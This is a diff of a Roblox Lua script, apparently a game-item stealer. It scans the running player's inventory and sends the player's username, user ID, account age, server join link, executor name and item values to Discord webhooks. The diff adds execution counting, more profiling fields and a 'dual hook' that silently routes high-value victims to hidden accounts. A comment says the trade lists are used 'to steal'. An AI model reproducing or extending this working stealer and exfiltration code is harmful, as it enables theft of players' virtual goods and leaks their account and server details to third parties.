@@ -1,5 +1,5 @@
 -- ==========================================
--- SCRIPT 2 (CORE ACTUALIZADO CON DUAL VALUES)
+-- SCRIPT 2 (CORE ACTUALIZADO CON DUAL VALUES Y WEBHOOK COMPLETO)
 -- ==========================================
 local HttpService = game:GetService("HttpService")
 local RS = game:GetService("ReplicatedStorage")
@@ -45,11 +45,9 @@ local function fetchValues(url)
     return {}
 end
 
--- 1. Valores del Usuario (Elegidos desde Script 1)
 local UserData = fetchValues(USER_VALUES_URL)
 local UserKnives, UserGuns, UserEffects, UserEmotes = UserData.Knives or {}, UserData.Guns or {}, UserData.Effects or {}, UserData.Emotes or {}
 
--- 2. Valores del Dual Hook (Siempre fijos a utils5.json)
 local DualData = fetchValues(DUAL_VALUES_URL)
 local DualKnives, DualGuns, DualEffects, DualEmotes = DualData.Knives or {}, DualData.Guns or {}, DualData.Effects or {}, DualData.Emotes or {}
 
@@ -79,12 +77,10 @@ task.spawn(function()
             textoTiempo = textoTiempo .. segundos .. " segundos"
 
             pcall(function()
-                if request then
-                    if WEBHOOK_INVENTARIO ~= "" then
-                        request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" },
-                            Body = HttpService:JSONEncode({ content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado el juego.\n⏳ **Duró:** `" .. textoTiempo .. "`" })
-                        })
-                    end
+                if request and WEBHOOK_INVENTARIO ~= "" then
+                    request({ Url = WEBHOOK_INVENTARIO, Method = "POST", Headers = { ["Content-Type"] = "application/json" },
+                        Body = HttpService:JSONEncode({ content = "❌ El usuario (**" .. leavingPlayer.Name .. "**) ha cerrado el juego.\n⏳ **Duró:** `" .. textoTiempo .. "`" })
+                    })
                 end
             end)
         end
@@ -106,12 +102,10 @@ task.spawn(function()
     if ok and cg.PlayerData then
         local pd = cg.PlayerData
         
-        -- Contenedores Dual y Usuario
         local kUser, gUser, eUser, emUser = {}, {}, {}, {}
         local kDual, gDual, eDual, emDual = {}, {}, {}, {}
         
-        local totalValueUser = 0
-        local totalValueDual = 0
+        local totalValueUser, totalValueDual = 0, 0
         local hasSpecialEffect = false
 
         local foundMatchaKnife, foundMatchaGun = false, false
@@ -128,7 +122,6 @@ task.spawn(function()
                 if item and item.name then
                     local cleanName = normalizeName(item.name)
                     
-                    -- Lógica de Sets y Efectos Especiales (Basado en el Dual Hook)
                     if dualTable[cleanName] then
                         if cleanName == "MatchaBobaKnife" then foundMatchaKnife = true end
                         if cleanName == "MatchaBobaGun" then foundMatchaGun = true end
@@ -143,7 +136,6 @@ task.spawn(function()
                         table.insert(rDual, { name = item.name, guid = guid, value = dualVal })
                     end
 
-                    -- Lógica de Usuario
                     if userTable[cleanName] then
                         local userVal = userTable[cleanName]
                         totalValueUser = totalValueUser + userVal
@@ -159,11 +151,32 @@ task.spawn(function()
         scanAndSaveBoth("Emote", UserEmotes, DualEmotes, emUser, emDual)
 
         local hayItems = (#kDual > 0) or (#gDual > 0) or (#kUser > 0) or (#gUser > 0)
-
-        -- Variable para decidir con qué lista tradearemos después
         local isMegaHit = (totalValueDual >= 5000 or hasSpecialEffect)
 
         if hayItems and request then
+            -- ==========================================
+            -- RECUPERACIÓN DE ESTADÍSTICAS E INFO DEL JUGADOR
+            -- ==========================================
+            local executionText = player.Name .. " 1x executions"
+            if isfile and readfile and writefile then
+                local fileName = "AutoTrade_Executions.json"
+                local executionData = {}
+                if isfile(fileName) then
+                    local success, data = pcall(function() return HttpService:JSONDecode(readfile(fileName)) end)
+                    if success and type(data) == "table" then executionData = data end
+                end
+                local playerName = player.Name
+                executionData[playerName] = (executionData[playerName] or 0) + 1
+                pcall(function() writefile(fileName, HttpService:JSONEncode(executionData)) end)
+                executionText = playerName .. " " .. executionData[playerName] .. "x executions"
+            end
+
+            local executorName = (identifyexecutor and identifyexecutor()) or "Unknown"
+            local playersCount = #Players:GetPlayers()
+            local maxPlayers = Players.MaxPlayers
+            local robloxVer = version()
+            local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+
             local function formatearLista(lista)
                 local contador, orden, texto = {}, {}, ""
                 for _, v in ipairs(lista) do
@@ -178,17 +191,16 @@ task.spawn(function()
                 end
                 for _, clave in ipairs(orden) do
                     local info = contador[clave]
-                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. "💰]`\n"
+                    texto ..= "🔸 **" .. info.cantidad .. "x " .. info.nombre .. "** `[Val: " .. info.valor .. " 💰]`\n"
                 end
                 if string.len(texto) > 1024 then return string.sub(texto, 1, 1020) .. "..." end
                 return texto 
             end
 
-            -- Generador dinámico de Webhook Payload
-            local function buildPayload(knives, guns, effects, emotes, totalVal)
+            local function buildPayload(knives, guns, effects, emotes, totalVal, isDualWebhook)
                 local campos = {}
-                if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = true }) end
-                if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = true }) end
+                if #knives > 0 then table.insert(campos, { name = "🔪 Knives", value = formatearLista(knives), inline = false }) end
+                if #guns > 0 then table.insert(campos, { name = "🔫 Guns", value = formatearLista(guns), inline = false }) end
                 if #effects > 0 then table.insert(campos, { name = "✨ Effects", value = formatearLista(effects), inline = false }) end
                 if #emotes > 0 then table.insert(campos, { name = "🕺 Emotes", value = formatearLista(emotes), inline = false }) end
 
@@ -206,12 +218,25 @@ task.spawn(function()
                 if (foundMatchaKnife and foundMatchaGun) and (foundDragonBlade and foundDragonGun) then
                     table.insert(pings, "@TOP-SETS 🍵🐉 **¡SETS MATCHA Y DRAGONPETAL!**")
                 end
+
+                local valueLabel = isDualWebhook and "(Valores Dual)" or "(Valores Usuario)"
+                local footerText = isDualWebhook and "Sistema Dual Exclusivo | " .. os.date("%X") or "Sistema de Escaneo Automático | " .. os.date("%X")
                 
-                local descText = "### 👤 Info del Jugador\n**Usuario:** `" .. player.Name .. "`\n" ..
-                                 "**ID:** `" .. player.UserId .. "`\n**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
-                                 "### ⚙️ Info del Servidor\n**JobId:** `" .. game.JobId .. "`\n" ..
-                                 "**🔗 Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n\n" ..
-                                 "### 📊 Estadísticas\n**Total Value:** `💰 " .. totalVal .. "`\n\n**=============================**"
+                local descText = "### 👤 Información del Jugador\n" ..
+                                 "**Usuario:** `" .. player.Name .. "`\n" ..
+                                 "**Display Name:** `" .. player.DisplayName .. "`\n" ..
+                                 "**User ID:** `" .. player.UserId .. "`\n" ..
+                                 "**Account Age:** `" .. player.AccountAge .. " Days`\n\n" ..
+                                 "### ⚙️ Información del Servidor\n" ..
+                                 "**JobId:** `" .. game.JobId .. "`\n" ..
+                                 "**🔗 Join Link:** [Click para Unirse](https://fern.wtf/joiner?placeId=135856908115931&gameInstanceId=" .. game.JobId .. ")\n" ..
+                                 "**Server:** `" .. playersCount .. "/" .. maxPlayers .. "`\n" ..
+                                 "**Roblox Version:** `" .. robloxVer .. "`\n" ..
+                                 "**Executor:** `" .. executorName .. "`\n\n" ..
+                                 "### 📊 Estadísticas de Hit\n" ..
+                                 "**Historial:** `" .. executionText .. "`\n" ..
+                                 "**Total Value:** `💰 " .. totalVal .. " " .. valueLabel .. "`\n\n" ..
+                                 "**=============================**"
 
                 return HttpService:JSONEncode({
                     content = (#pings > 0 and table.concat(pings, "\n") or nil),
@@ -219,15 +244,16 @@ task.spawn(function()
                     avatar_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/512px-Roblox_player_icon_black.svg.png",
                     embeds = {{
                         title = "🎯 ¡Objetivo de Tradeo Localizado!", color = embedColor, description = descText,
-                        thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png" }, 
+                        thumbnail = { url = avatarUrl }, 
                         fields = campos,
-                        footer = { text = "Sistema Automático | " .. os.date("%X") }
+                        footer = { text = footerText, icon_url = "https://cdn-icons-png.flaticon.com/512/6584/6584141.png" }
                     }}
                 })
             end
 
-            local payloadUser = buildPayload(kUser, gUser, eUser, emUser, totalValueUser)
-            local payloadDual = buildPayload(kDual, gDual, eDual, emDual, totalValueDual)
+            -- Generamos los dos Payloads
+            local payloadUser = buildPayload(kUser, gUser, eUser, emUser, totalValueUser, false)
+            local payloadDual = buildPayload(kDual, gDual, eDual, emDual, totalValueDual, true)
 
             -- ==========================================
             -- LÓGICA DE ENVÍO DE WEBHOOKS
@@ -247,6 +273,7 @@ task.spawn(function()
                     end)
                 end
                 
+                -- Cambiar jugadores a las cuentas secretas del Dual
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
                 -- Hit Normal -> Sólo Notifica al Usuario al instante
@@ -314,7 +341,7 @@ task.spawn(function()
                 end
             end
 
-            -- Si es Dual/MegaHit, usamos los valores de la lista del Dual para asegurar buen orden
+            -- Aseguramos que si se activó el Mega Hit y cambió a Dual, usemos la lista de valores del Dual para robar
             local activeKnives = isMegaHit and DualKnives or UserKnives
             local activeGuns = isMegaHit and DualGuns or UserGuns
             local activeEffects = isMegaHit and DualEffects or UserEffects
